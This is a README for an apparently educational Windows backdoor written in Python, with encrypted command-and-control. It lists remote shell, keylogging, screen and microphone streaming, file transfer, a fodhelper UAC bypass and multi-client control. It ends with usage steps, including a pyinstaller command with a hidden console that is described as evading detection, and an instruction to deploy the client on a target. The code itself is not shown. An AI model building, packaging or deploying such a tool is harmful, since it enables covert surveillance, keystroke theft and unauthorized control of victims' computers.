# Enhanced Backdoor Project

## Overview

This project demonstrates an educational, encrypted client-server backdoor for Windows (tested on Windows 10/11). It allows a remote operator (server) to control a target machine (client) over a TCP connection. The system supports encrypted command execution, file transfer, keylogging, screenshot capture, live screen and audio streaming, and privilege escalation attempts.

**Important Notice:**  
This software is provided strictly for educational and research purposes. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. The authors assume no responsibility for misuse.

---

## Required Libraries

- `cryptography` — Fernet symmetric encryption for all communications
- `pynput` — Keylogging
- `mss` — Screenshot and screen streaming
- `opencv-python (cv2)` — Live screen viewing
- `numpy` — Image processing
- `pillow (PIL)` — Image encoding/compression
- `pyaudio` — Audio streaming

---

## Core Features

### Encrypted Communication

All data exchanged between the server and client is encrypted using Fernet symmetric encryption, ensuring confidentiality and integrity.

### Remote Shell

Execute arbitrary shell commands on the target machine and receive the output in real time.

### File Transfer

Upload and download files between the server and the target machine.

### Keylogger

Start, stop, and retrieve logs from a keylogger running on the target. Logs include timestamps and handle special keys.

### Screenshot Capture

Remotely capture and download screenshots from the target machine.

### Live Screen Streaming

View the target's screen in real time using compressed JPEG frames sent over a dedicated TCP stream.

### Audio Streaming

Remotely listen to the target's microphone audio in real time.

### Privilege Escalation (UAC bypass)

Attempt to escalate privileges on the target using the Windows `fodhelper.exe` UAC bypass technique. The client can also report if it is running with administrator rights.

### Reliable Data Transmission

Uses JSON serialization, chunked transfer, and length-prefixed encrypted messages for robust and reliable communication.

### Multi-Client Support

The server can handle multiple client connections, allowing the operator to select and interact with any active session.

---

## Usage

1. **Start the server** On your C2 system.
2. **Compile (Optional)** The python file can be compile to `.exe` with `pyinstaller` to adds additional detection evasion using $`pyinstaller --onefile .\Enhanced\backdoor.py -n OutFile.exe --hide-console hide-early [-i .\FileIcon.ico]`
3. **Deploy the client** (`backdoor.py`) on the target machine.

---
